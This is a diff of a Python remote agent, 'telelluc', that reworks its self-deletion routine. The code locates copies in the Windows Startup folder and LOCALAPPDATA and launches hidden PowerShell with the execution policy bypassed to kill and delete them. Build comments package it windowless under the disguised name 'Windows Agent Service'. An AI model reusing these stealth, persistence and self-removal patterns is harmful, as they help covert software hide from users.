@@ -12,8 +12,8 @@ import urllib.error
 import urllib.request
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-#cd /d C:\Users\User\Desktop\telelluc
-#python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py
+# cd /d C:\Users\User\Desktop\telelluc
+# python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py
 
 PORT = 5005
 
@@ -143,47 +143,42 @@ def self_delete_agent(trigger_id):
         "Programs",
         "Startup",
     )
-    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
+    startup_exe = os.path.join(startup_dir, "TelellucAgent.exe")
     current_exe = os.path.abspath(sys.executable) if getattr(sys, "frozen", False) else os.path.abspath(__file__)
-    local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Windows Agent Service")
-    local_exe = os.path.join(local_dir, "Windows Agent Service.exe")
+    local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
+    local_exe = os.path.join(local_dir, "TelellucAgent.exe")
 
-    target_path = None
-    if startup_exe and os.path.exists(startup_exe):
-        target_path = startup_exe
-    elif current_exe and os.path.exists(current_exe):
-        target_path = current_exe
-    elif local_exe and os.path.exists(local_exe):
-        target_path = local_exe
+    legacy_startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
+    legacy_local_exe = os.path.join(local_dir, "Windows Agent Service.exe")
 
+    candidates = []
+    for path in [startup_exe, current_exe, local_exe, legacy_startup_exe, legacy_local_exe]:
+        if path and os.path.exists(path):
+            candidates.append(os.path.abspath(path))
+
+    target_path = candidates[0] if candidates else None
     if target_path is None:
-        try:
-            os._exit(0)
-        except Exception:
-            raise SystemExit(0)
+        return
 
-    batch_lines = [
-        "@echo off",
-        "setlocal",
-        "set \"target=%~1\"",
-        "timeout /t 2 /nobreak >nul",
-        "taskkill /F /IM \"Windows Agent Service.exe\" /T 2>nul",
-        ":retry",
-        "if exist \"%target%\" del /f /q \"%target%\" 2>nul",
-        "if exist \"%target%\" (",
-        "  timeout /t 1 /nobreak >nul",
-        "  goto :retry",
-        ")",
-        "exit /b 0",
-    ]
+    target_path_escaped = target_path.replace("'", "''")
+    script = f"""
+$target = [System.IO.Path]::GetFullPath('{target_path_escaped}');
+Start-Sleep -Seconds 2;
+Stop-Process -Name 'TelellucAgent' -Force -ErrorAction SilentlyContinue;
+Stop-Process -Name 'Windows Agent Service' -Force -ErrorAction SilentlyContinue;
+for ($i = 0; $i -lt 10; $i++) {{
+    try {{
+        Remove-Item -LiteralPath $target -Force -ErrorAction Stop;
+        break
+    }} catch {{
+        Start-Sleep -Seconds 1
+    }}
+}}
+"""
 
-    tmp_dir = tempfile.gettempdir()
-    batch_path = os.path.join(tmp_dir, f"telelluc_self_delete_{int(time.time())}.bat")
     try:
-        with open(batch_path, "w", encoding="utf-8") as fh:
-            fh.write("\n".join(batch_lines) + "\n")
         subprocess.Popen(
-            ["cmd", "/c", batch_path, target_path],
+            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
             creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
